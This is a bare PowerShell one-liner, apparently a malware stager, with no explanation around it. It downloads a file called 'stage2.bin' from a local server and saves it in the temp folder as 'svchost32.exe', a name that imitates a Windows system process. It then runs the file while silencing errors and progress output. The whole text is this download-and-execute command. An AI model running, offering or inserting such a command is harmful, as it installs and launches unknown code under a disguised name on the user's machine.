
Invoke-WebRequest -Uri "http://localhost:8081/stage2.bin" -OutFile "$env:TEMP\svchost32.exe" -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "$env:TEMP\svchost32.exe" -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = "SilentlyContinue"
